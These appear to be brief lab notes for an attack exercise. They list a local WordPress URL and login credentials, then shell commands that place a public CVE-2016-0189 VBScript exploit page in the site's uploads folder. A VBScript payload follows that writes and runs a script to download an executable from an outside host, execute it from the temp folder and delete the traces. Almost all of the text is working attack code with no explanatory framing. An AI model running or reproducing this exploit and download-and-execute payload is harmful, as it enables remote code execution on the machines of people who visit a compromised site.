test

http://192.168.0.5:8016/

kisec / kisec123

cd /var/www/wordpress/wp-content/uploads/contact_files/

ls

wget https://raw.githubusercontent.com/theori-io/cve-2016-0189/master/exploit/vbscript_godmode.html -O exploit.html

set shell=createobject("Shell.Application")
shell.ShellExecute "cmd.exe", "/c CD %TEMP%&@echo Set objXMLHTTP=CreateObject(""MSXML2.XMLHTTP"")>down_exec.vbs&@echo objXMLHTTP.open ""GET"",""http://www.greyhathacker.net/tools/messbox.exe"",false>>down_exec.vbs&@echo objXMLHTTP.send()>>down_exec.vbs&@echo If objXMLHTTP.Status=200 Then>>down_exec.vbs&@echo Set objADOStream=CreateObject(""ADODB.Stream"")>>down_exec.vbs&@echo objADOStream.Open>>down_exec.vbs&@echo objADOStream.Type=1 >>down_exec.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>down_exec.vbs&@echo objADOStream.Position=0 >>down_exec.vbs&@echo objADOStream.SaveToFile ""%TEMP%\messbox.exe"">>down_exec.vbs&@echo objADOStream.Close>>down_exec.vbs&@echo Set objADOStream=Nothing>>down_exec.vbs&@echo End if>>down_exec.vbs&@echo Set objXMLHTTP=Nothing>>down_exec.vbs&@echo Set objShell=CreateObject(""WScript.Shell"")>>down_exec.vbs&@echo objShell.Exec(""%TEMP%\messbox.exe"")>>down_exec.vbs&del %TEMP%\messbox.exe&cscript.exe %TEMP%\down_exec.vbs&del %TEMP%\down_exec.vbs", "", "open", 0
